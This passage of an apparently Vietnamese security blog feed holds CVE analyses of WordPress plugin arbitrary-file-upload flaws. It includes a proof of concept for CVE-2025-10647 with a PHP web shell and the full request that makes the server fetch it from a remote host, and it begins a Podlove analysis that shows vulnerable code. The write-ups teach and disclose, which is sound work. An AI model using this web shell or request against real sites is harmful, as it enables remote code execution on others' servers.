2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Subcriber POST -&amp;gt; /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media&amp;amp;url=...&amp;#34;] --&amp;gt; B[&amp;#34;ajax_handler_download_pdf_media()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;check_ajax_referer(&amp;#39;epdf_wf_download_pdf_media&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;download_url($url) -&amp;gt; $tmp_file (temporary file)&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;is_wp_error($tmp_file) ?&amp;#34;}&#xA;E -- &amp;#34;yes&amp;#34; --&amp;gt; F[&amp;#34;wp_send_json_error() -&amp;gt; STOP&amp;#34;]&#xA;E -- &amp;#34;no&amp;#34; --&amp;gt;  K[&amp;#34;Uploaded file accessible ‚Üí potential RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy c·∫≠p trang ch·ª©a form ƒë∆∞·ª£c t·∫°o t·ª´ &lt;strong&gt;WPForms&lt;/strong&gt; s·ª≠ d·ª•ng &lt;strong&gt;PDF Viewer&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y nonce&lt;/li&gt;&#xA;&lt;li&gt;T·∫°o file &lt;code&gt;.php&lt;/code&gt; ch·ª©a code RCE v√† l∆∞u tr·ªØ tr√™n internet&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;G·ª≠i POST request v·ªõi url tr·ªè ƒë·∫øn file v·ª´a t·∫°o.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7C69db0f51f219492ec3f150bb86bc1364f7cd33442587ddf3f1bf334e4cdec409; wp-settings-time-2=1761725656; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wp-settings-2=editor%3Dtinymce%26libraryContent%3Dbrowse; wp-settings-time-3=1761711790; wp-settings-3=libraryContent%3Dbrowse; _lscache_vary=fff4fa950d2b9daa95c3289bb2a7040a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7Ca7cb9996e74be71e18c68f339c0ad07a43687c7eb701f89fe90374cc2a783131; wp-settings-time-5=1761992371&#xA;...&#xA;&#xA;_ajax_nonce=ea2ccf0ccd&amp;amp;action=epdf_wf_download_pdf_media&amp;amp;url=https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Truy c·∫≠p file v·ª´a t·∫°o v√† RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/result.png&#34; title=&#34;RCE v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/result.png&#39; alt=&#34;Result&#34; height=&#34;619&#34; width=&#34;1145&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng cho ph√©p &lt;strong&gt;arbitrary file upload&lt;/strong&gt; trong &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; l√† do thi·∫øu ki·ªÉm tra quy·ªÅn v√† ki·ªÉu file khi t·∫£i file t·ª´ URL, d·∫´n ƒë·∫øn kh·∫£ nƒÉng k·∫ª t·∫•n c√¥ng c√≥ t√†i kho·∫£n Subscriber t·∫£i l√™n file th·ª±c thi (v√≠ d·ª• &lt;code&gt;.php&lt;/code&gt;) v√† g√¢y &lt;strong&gt;RCE&lt;/strong&gt;. Nh√† ph√°t tri·ªÉn ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch ki·ªÉm tra &lt;code&gt;current_user_can(&#39;upload_files&#39;)&lt;/code&gt; v√† x√°c th·ª±c MIME v·ªõi &lt;code&gt;wp_check_filetype()&lt;/code&gt; trong phi√™n b·∫£n &lt;strong&gt;1.1.6&lt;/strong&gt;. ƒê·ªëi v·ªõi site b·ªã ·∫£nh h∆∞·ªüng, c·∫ßn c·∫≠p nh·∫≠t l√™n 1.1.6 ngay, ki·ªÉm tra v√† xo√° c√°c file kh·∫£ nghi trong th∆∞ m·ª•c uploads, r√† so√°t quy·ªÅn ng∆∞·ªùi d√πng v√† nh·∫≠t k√Ω ƒë·ªÉ ph√°t hi·ªán d·∫•u hi·ªáu khai th√°c.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng (&lt;code&gt;current_user_can&lt;/code&gt;) tr∆∞·ªõc khi th·ª±c hi·ªán upload qua AJAX.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n x√°c th·ª±c ki·ªÉu/MIME c·ªßa file (&lt;code&gt;wp_check_filetype&lt;/code&gt; / whitelist) tr∆∞·ªõc khi l∆∞u.&lt;/li&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t plugin nhanh ch√≥ng khi c√≥ b·∫£n v√°; r√† so√°t file upload v√† log sau khi ph√°t hi·ªán l·ªói.&lt;/li&gt;&#xA;&lt;li&gt;√Åp d·ª•ng nguy√™n t·∫Øc √≠t quy·ªÅn nh·∫•t (least privilege) v√† gi√°m s√°t h√†nh vi b·∫•t th∆∞·ªùng trong media/uploads.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/embed-pdf-wpforms/vulnerability/wordpress-embed-pdf-for-wpforms-plugin-1-1-5-authenticated-subscriber-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed PDF for WPForms Plugin &amp;lt;= 1.1.5 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10147 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-05-cve-2025-10147/</link>
      <pubDate>Wed, 05 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-05-cve-2025-10147/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Podlove Podcast Publisher&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; c√≥ l·ªó h·ªïng cho ph√©p &lt;strong&gt;arbitrary file uploads&lt;/strong&gt; do thi·∫øu ki·ªÉm tra lo·∫°i t·ªáp trong h√†m &lt;code&gt;&#39;move_as_original_file&#39;&lt;/code&gt; ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ªõi v√† bao g·ªìm &lt;strong&gt;4.2.6&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; t·∫£i l√™n c√°c t·ªáp t√πy √Ω l√™n m√°y ch·ªß c·ªßa site b·ªã ·∫£nh h∆∞·ªüng, ƒëi·ªÅu c√≥ th·ªÉ d·∫´n t·ªõi &lt;strong&gt;remote code execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10147&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10147&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.2.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Podlove Podcast Publisher Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Podlove Podcast Publisher&lt;/strong&gt;: &lt;strong&gt;4.2.6&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;4.2.7&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Theo m√¥ t·∫£ c·ªßa CVE th√¨ v·ªã tr√≠ l·ªói n·∫±m ·ªü h√†m &lt;code&gt;move_as_original_file()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function move_as_original_file($file)&#xA;{&#xA;    $move_new_file = @rename($file, $this-&amp;gt;original_file());&#xA;&#xA;    if (false === $move_new_file) {&#xA;        Log::get()-&amp;gt;addWarning(&#xA;            sprintf(&#xA;                __(&amp;#39;Podlove Image Cache: The downloaded image could not be moved to %s.&amp;#39;),&#xA;                $this-&amp;gt;original_file()&#xA;            )&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;move_as_original_file($file)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán &lt;strong&gt;di chuy·ªÉn file t·∫°m &lt;code&gt;$file&lt;/code&gt;&lt;/strong&gt; (v·ª´a ƒë∆∞·ª£c t·∫£i v·ªÅ t·ª´ URL)&#xA;‚Üí sang &lt;strong&gt;ƒë∆∞·ªùng d·∫´n c·ªë ƒë·ªãnh&lt;/strong&gt; tr·∫£ v·ªÅ b·ªüi &lt;code&gt;$this-&amp;gt;original_file()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;rename()&lt;/code&gt; trong PHP = &lt;strong&gt;move file&lt;/strong&gt; (chuy·ªÉn v·ªã tr√≠ file, kh√¥ng copy).&lt;/li&gt;&#xA;&lt;li&gt;D·∫•u &lt;code&gt;@&lt;/code&gt; d√πng ƒë·ªÉ &lt;strong&gt;·∫©n l·ªói PHP&lt;/strong&gt; n·∫øu thao t√°c th·∫•t b·∫°i.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;rename()&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;false&lt;/code&gt;, plugin ghi c·∫£nh b√°o v√†o log.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function original_file()&#xA;{&#xA;    return implode(DIRECTORY_SEPARATOR, [&#xA;        $this-&amp;gt;upload_basedir, $this-&amp;gt;file_name(&amp;#39;original&amp;#39;)&#xA;    ]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‚Üí T·∫°o &lt;strong&gt;ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi tr√™n server&lt;/strong&gt;, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$this-&amp;gt;upload_basedir&lt;/code&gt; (t·ª´ &lt;code&gt;__construct()&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Class Image {&#xA;    public function __construct($url, $file_name = &amp;#39;&amp;#39;)&#xA;    {&#xA;        // FIXME: if $file_name is empty, the url will not work. I must not treat this silently!&#xA;        $this-&amp;gt;source_url = trim($url ?? &amp;#39;&amp;#39;);&#xA;        $this-&amp;gt;file_name = sanitize_title($file_name);&#xA;&#xA;        // manually remove troublemaking characters&#xA;        // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/&#xA;        // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947&#xA;        if (function_exists(&amp;#39;iconv&amp;#39;)) {&#xA;            $this-&amp;gt;file_name = iconv(&amp;#39;UTF-8&amp;#39;, &amp;#39;ASCII//TRANSLIT&amp;#39;, $this-&amp;gt;file_name);&#xA;        }&#xA;        $this-&amp;gt;file_name = preg_replace(&amp;#39;~[^-a-z0-9_]&amp;#43;~&amp;#39;, &amp;#39;&amp;#39;, $this-&amp;gt;file_name);&#xA;&#xA;        $this-&amp;gt;file_extension = $this-&amp;gt;extract_file_extension();&#xA;        $this-&amp;gt;id = md5($url.$this-&amp;gt;file_name);&#xA;&#xA;        // create subdirectories to avoid too many directories in the root directory&#xA;        $id_directory = substr($this-&amp;gt;id, 0, 2).&amp;#39;/&amp;#39;.substr($this-&amp;gt;id, 2);&#xA;&#xA;        $this-&amp;gt;upload_basedir = self::cache_dir().$id_directory;&#xA;        $this-&amp;gt;upload_baseurl = content_url(&amp;#39;cache/podlove/&amp;#39;).$id_directory;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê∆∞·ª£c t·∫°o d·ª±a tr√™n &lt;code&gt;cache_dir()&lt;/code&gt; v√† hash MD5 c·ªßa URL,&#xA;‚Üí n·∫±m trong th∆∞ m·ª•c:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-content/cache/podlove/&amp;lt;2 k√Ω t·ª± ƒë·∫ßu&amp;gt;/&amp;lt;ph·∫ßn c√≤n l·∫°i&amp;gt;/&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 